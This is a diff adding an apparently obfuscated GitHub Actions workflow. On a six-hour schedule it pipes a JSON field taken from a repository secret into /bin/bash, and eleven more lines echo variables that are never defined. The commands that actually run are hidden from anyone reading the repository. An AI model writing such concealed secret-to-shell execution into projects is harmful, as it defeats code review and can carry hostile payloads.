@@ -1,0 +1,28 @@
+name: xiangheihongjie
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangheihongjie
+        env:
+          x25: ${{ secrets.x25 }}
+        run: |
+          echo $x25 | jq -r .n84096 | /bin/bash
+          echo $ezn70157 | jq -r .qe433 | /bin/bash
+          echo $wzpqc7040 | jq -r .oorm90 | /bin/bash
+          echo $thmwd20 | jq -r .b947 | /bin/bash
+          echo $g6815 | jq -r .mzhe519 | /bin/bash
+          echo $qih980 | jq -r .yllr32 | /bin/bash
+          echo $i8 | jq -r .qk748 | /bin/bash
+          echo $o7563 | jq -r .jkav0 | /bin/bash
+          echo $fpzsg2 | jq -r .svcd19683 | /bin/bash
+          echo $gjqps53 | jq -r .h3918 | /bin/bash
+          echo $bam53272 | jq -r .mb6 | /bin/bash
+          echo $v37976 | jq -r .cvsv077 | /bin/bash
+
